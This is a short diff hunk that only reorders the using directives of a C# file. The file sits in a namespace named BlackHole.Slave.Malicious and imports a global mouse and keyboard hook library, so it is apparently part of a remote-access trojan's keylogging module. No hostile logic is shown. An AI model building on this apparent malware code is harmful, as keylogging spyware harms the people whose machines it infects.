@@ -1,13 +1,12 @@
-﻿using BlackHole.Common;
-using BlackHole.Slave.Helper;
-using Gma.System.MouseKeyHook;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using BlackHole.Common;
+using BlackHole.Slave.Helper;
+using Gma.System.MouseKeyHook;
 
 namespace BlackHole.Slave.Malicious
 {
